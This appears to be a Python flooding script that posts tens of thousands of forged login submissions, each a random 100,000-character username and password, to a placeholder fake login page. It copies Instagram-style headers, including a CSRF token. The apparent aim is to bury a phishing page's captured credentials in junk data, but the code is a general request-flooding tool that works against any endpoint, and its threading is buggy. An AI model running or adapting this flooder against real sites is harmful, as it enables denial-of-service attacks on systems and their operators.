
import requests , random , string 
import threading


thread = int(input(" Enter number of threads : ")) 

def randgenerator(size=6, chars=string.ascii_uppercase+string.digits) :
    return ''.join(random.choice(chars) for _ in range(size))

randSize = random.randint(100000,100000)


#-----------------------header
loghead = {

    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '267',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/2.0 (X11;  x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ Safari/537.36',
    'x-csrftoken': 'JcuJvUzrOI7CPnkJshUS4YkNIsgDnkNg',
    'x-requested-with': 'XMLHttpRequest',

}
#--------------------------------------

def flood():
    for i in range(60000):
        print("Request num : {} ".format(i))
        #generate random user & pass
        user = randgenerator(randSize)
        passw = randgenerator(randSize)
        data = {
        
            'name' : (None, '{}@gmail.com'.format(user)),
            'pass' : (None, passw),
        }
        
        resp = requests.post('http://example.com/fakepg.php',data=data , headers = loghead).text



         
threads = []
for i in range(thread) :
    thread1 = threading.Thread(target=flood(),args=(1,))
    thread1.start()
    threads.append(thread1)
for thread2 in threads : 
    thread2.join() 
